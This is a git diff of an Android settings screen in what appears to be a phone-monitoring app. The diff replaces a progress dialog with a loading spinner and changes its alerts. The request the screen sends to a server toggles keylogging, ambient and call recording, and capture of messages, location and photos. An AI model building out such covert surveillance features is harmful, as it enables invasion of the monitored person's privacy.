@@ -41,11 +41,16 @@ import com.jexpa.secondclone.Model.Table;
 import com.jexpa.secondclone.R;
 import com.google.gson.Gson;
 import com.jexpa.secondclone.API.Global;
+import com.wang.avi.AVLoadingIndicatorView;
+
 import org.json.JSONException;
 import org.json.JSONObject;
 import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.List;
+
+import static com.jexpa.secondclone.API.APIMethod.startAnim;
+import static com.jexpa.secondclone.API.APIMethod.stopAnim;
 import static com.jexpa.secondclone.API.Global.LIMIT_REFRESH;
 import static com.jexpa.secondclone.API.Global.REQUEST_CODE_GPS_ACCESS_CODE;
 import static com.jexpa.secondclone.API.Global.time_Refresh_Setting;
@@ -68,7 +73,8 @@ public class SyncSettings extends AppCompatActivity implements View.OnClickListe
     private int packageID;
     private List<DeviceFeatures> deviceFeatureList = new ArrayList<>();
     public DatabaseGetSetting databaseGetSetting;
-    ProgressDialog progressDialog;
+    // aviSyncSettings
+    private AVLoadingIndicatorView avLoadingIndicatorView;
     private DeviceFeatures deviceFeature = new DeviceFeatures();
     public static String DEVICE_NAME;
 
@@ -76,10 +82,6 @@ public class SyncSettings extends AppCompatActivity implements View.OnClickListe
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_syncsettings);
-        progressDialog = new ProgressDialog(SyncSettings.this);
-        progressDialog.setTitle(MyApplication.getResourcses().getString(R.string.Loading)+"...");
-        progressDialog.setCanceledOnTouchOutside(false);
-        progressDialog.show();
         DEVICE_NAME = Settings.Secure.getString(getContentResolver(), "bluetooth_name") + "  ";
         /* database */
         DatabaseDevice databaseDevice = new DatabaseDevice(this);
@@ -114,6 +116,7 @@ public class SyncSettings extends AppCompatActivity implements View.OnClickListe
     /** Set ID from activity_dashboard for class variable */
     private void setID() {
 
+        avLoadingIndicatorView = findViewById(R.id.aviSyncSettings);
         ImageView img_Phone_Type = findViewById(R.id.img_PhoneStyle);
         TextView txt_NamePhone = findViewById(R.id.txt_NamePhone);
         TextView txt_PhoneStyle = findViewById(R.id.txt_PhoneStyle);
@@ -201,6 +204,8 @@ public class SyncSettings extends AppCompatActivity implements View.OnClickListe
 
     private void getSetting() {
         if (APIURL.isConnected(this)) {
+            avLoadingIndicatorView.setVisibility(View.VISIBLE);
+            startAnim(avLoadingIndicatorView);
             new getSettingAsyncTask().execute();
         } else {
             /*  int i: Count objects in the User table.
@@ -209,7 +214,6 @@ public class SyncSettings extends AppCompatActivity implements View.OnClickListe
             int i = databaseGetSetting.getSettingCount();
             if (i == 0) {
                 Toast.makeText(this, "The data of this device " + table.getDevice_Name() + " has not been saved to memory! Please turn on the internet and go back to the app to save the data.", Toast.LENGTH_LONG).show();
-                APIDatabase.getThread(progressDialog);
 
             } else {
                 /* Check if the table exists! */
@@ -314,21 +318,18 @@ public class SyncSettings extends AppCompatActivity implements View.OnClickListe
                     if (deviceFeature.getConnection_Type().contains("AutoOpenAllTypes")) {
                         wc_Auto_TurnOn_Wifi.setChecked(true);
                     }
-
-                    APIDatabase.getThread(progressDialog);
                 }
 
                 /*
                   if(testDevice == false) is table does not exist
                  */
                 else {
-                    Toast.makeText(this, "The data of this device " + table.getDevice_Name() + " has not been saved to memory! Please turn on the internet and go back to the app to save the data.", Toast.LENGTH_LONG).show();
-                    APIDatabase.getThread(progressDialog);
+
+                    APIURL.alertDialog(SyncSettings.this,"Save & Sync",getString(R.string.SaveAndSync_NotSave,table.getDevice_Name()));
                 }
             }
         }
     }
-
 
     @SuppressLint("SetTextI18n")
     @Override
@@ -337,7 +338,6 @@ public class SyncSettings extends AppCompatActivity implements View.OnClickListe
         if (resultCode == RESULT_OK && requestCode == REQUEST_CODE_GPS_ACCESS_CODE) {
             if (data.hasExtra("Code")) {
                 txt_Access_Code.setText(data.getExtras().getString("Code"));
-
             }
         }
         super.onActivityResult(requestCode, resultCode, data);
@@ -350,7 +350,8 @@ public class SyncSettings extends AppCompatActivity implements View.OnClickListe
             case R.id.btn_Save_Sync: {
                 MyApplication.getInstance().trackEvent("Dashboard", "Open Save_Sync", "");
                 if (APIURL.isConnected(this)) {
-                    progressDialog.show();
+                    avLoadingIndicatorView.setVisibility(View.VISIBLE);
+                    startAnim(avLoadingIndicatorView);
                     new set_SettingAsyncTask().execute();
                     new getSettingAsyncTask().execute();
                     //APIDatabase.getTimeLastSync(txt_Last_Sync, Dashboard.this, table.getModified_Date());
@@ -557,7 +558,8 @@ public class SyncSettings extends AppCompatActivity implements View.OnClickListe
                 if (deviceFeature.getConnection_Type().contains("AutoOpenAllTypes")) {
                     wc_Auto_TurnOn_Wifi.setChecked(true);
                 }
-                APIDatabase.getThread(progressDialog);
+                avLoadingIndicatorView.setVisibility(View.GONE);
+                stopAnim(avLoadingIndicatorView);
             } catch (JSONException e) {
                 MyApplication.getInstance().trackException(e);
                 e.printStackTrace();
@@ -802,7 +804,6 @@ public class SyncSettings extends AppCompatActivity implements View.OnClickListe
             String value ="";
             Log.d("asss", table.getDevice_ID());
             Log.d("asss", ManagementDevice.android_id);
-//            if (table.getDevice_ID().equals(ManagementDevice.android_id)) {
 
                 value = "<RequestParams " +
                         "App=\"" + Application +
@@ -841,19 +842,6 @@ public class SyncSettings extends AppCompatActivity implements View.OnClickListe
                         + " App_Installation=\"" + App_Install
                         + "\" Device_Name=\"" + DEVICE_NAME
                         + "\"  OS_Device=\"" + Global.MODEL + "\" />";
-
-//            }
-
-            Log.d("asss", value+ " Value");
-//            else {
-//                value = "<RequestParams App=\"" + Application + "\" Call=\"" + Call + "\" Voice_Memos=\"" + Voice + "\" GPS_Interval=\"" + GPS_Interval + "\" Bbm=\"" + BBM + "\"" +
-//                        " Device_Token=\"null\" Secret_Key=\"" + txt_Access_Code.getText() + "\" Hangouts=\"" + Hangouts + "\" Client_Date=\"" + APIURL.getTimeNow() + "\" " +
-//                        "SMS=\"" + SMS + "\" Ambient_Record=\"" + Ambient_Voice + "\" Device_ID=\"" + table.getDevice_ID() + "\" Video=\"" + Video + "\" WhatApp=\"" + WhatsApp + "\" Line=\"" + LINE + "\" " +
-//                        " Kik=\"" + KIK + "\" Keylogger=\"" + Key_Logger + "\"  Note=\"" + Notes + "\" Facebook=\"" + Facebook +"\" GPS=\"" + GPS + "\" Skype=\"" + Skype + "\" " +
-//                        " Photo=\"" + Photo + "\" Horizontal=\""+horizontal + "\" Connection_Type=\""+Connection_Type+"\" PhoneCallRecording=\"" + Phone_Call + "\" Contact=\"" + Contact + "\" URL=\"" + URLs + "\" Save_Battery=\"" + save_Battery + "\" Default_Phone=\"0\"" +
-//                        " Viber=\"" + Viber + "\" />";
-//
-//            }
             String function = "SetSetting";
             return APIURL.POST(value, function);
         }
@@ -865,13 +853,13 @@ public class SyncSettings extends AppCompatActivity implements View.OnClickListe
                 JSONObject jsonObject = new JSONObject(s);
                 Body body = APIURL.fromJson(jsonObject);
                 if (body.getResultId().equals("1") && body.getIsSuccess().equals("1")) {
-                    progressDialog.dismiss();
-                    APIURL.alertDialogAll(SyncSettings.this,"Saved successfully.");
+                    APIURL.alertDialog(SyncSettings.this,"Save & Sync","Saved successfully.");
                 } else {
-                    progressDialog.dismiss();
-                    APIURL.alertDialogAll(SyncSettings.this,"can't Update! "+ body.getResultId());
+                    APIURL.alertDialog(SyncSettings.this,"Save & Sync","can't Update! "+ body.getResultId());
 
                 }
+                avLoadingIndicatorView.setVisibility(View.GONE);
+                stopAnim(avLoadingIndicatorView);
             } catch (JSONException e) {
                 e.printStackTrace();
             }
@@ -911,14 +899,6 @@ public class SyncSettings extends AppCompatActivity implements View.OnClickListe
                 }
             }
         });
-    }
-
-    @Override
-    protected void onDestroy() {
-        super.onDestroy();
-        if (progressDialog != null && progressDialog.isShowing()) {
-            progressDialog.dismiss();
-        }
     }
 
     @Override
